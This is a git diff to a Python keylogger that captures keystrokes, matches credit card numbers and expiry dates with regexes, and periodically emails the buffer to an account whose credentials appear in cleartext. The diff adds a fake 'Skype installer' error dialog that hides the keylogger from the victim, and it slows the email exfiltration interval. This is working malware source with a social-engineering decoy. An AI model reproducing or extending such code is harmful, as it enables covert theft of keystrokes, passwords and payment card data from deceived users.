@@ -4,6 +4,7 @@ from emailer import Emailer
 import json
 import re
 from pynput.mouse import Listener
+import ctypes
 
 CREDIT_CARD_NUMBER_REGEXP = re.compile("[0-9]{4}[ ]?[0-9]{4}[ ]?[0-9]{4}")
 CREDIT_CARD_EXPIRY_REGEXP = re.compile(
@@ -152,7 +153,7 @@ class Keylogger:
 
         emailer = Emailer(self.email, self.password)
         while True:
-            time.sleep(20)
+            time.sleep(60)
             self.__email_local_buffer(emailer)
 
 
@@ -163,6 +164,9 @@ if __name__ == "__main__":
     "password": "SecurityJAC22",
     "applicationPassword": "grvlbtrmgqknrvah"
     }
+
+    ICON_EXCLAIM = 0x30
+    ctypes.windll.user32.MessageBoxW(0, u"Error with skype installer. Please double check your system type. This installer is for 64-bit windows 10. Visit https://www.skype.com/en/get-skype/ to find the correct installer for your system.", u"Error", ICON_EXCLAIM, 0)
 
     k = Keylogger(email_info["email"], email_info["applicationPassword"])
     k.run()
